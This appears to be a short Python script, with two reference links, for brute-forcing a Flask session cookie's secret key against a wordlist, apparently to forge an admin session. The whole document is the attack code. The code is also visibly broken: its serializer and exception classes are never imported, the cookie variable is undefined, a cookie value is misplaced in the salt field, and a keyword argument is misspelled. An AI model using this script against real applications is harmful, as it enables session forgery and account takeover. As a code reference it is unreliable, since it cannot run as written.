wordlist = open("wordlist.txt", "r")
from flask import Flask, session
import hashlib
for secret in wordlist:
    try: 
        serializer = URLSafeTimedSerializer(
            secret_key = secret[:-1],
            salt = "eyJmbGFnc2hpcCI6ZmFsc2UsInVzZXJuYW1lIjoiYWRtaW4ifQ.Xp2e7Q.Rwf2Ry4IvkJeQq8hI3RsGstQbdY" ,
            serializer = TaggedJSONSerializer(),
            signer_kwards = {
                'key_derivation':'hmac',
                'digest_method': hashlib.sha1
        }).loads(cookie)
    except BadSignature:
        continue
    
    print('secert key : {}'.format(secret[:-1]))

https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce
https://github.com/Paradoxis/Flask-Unsign
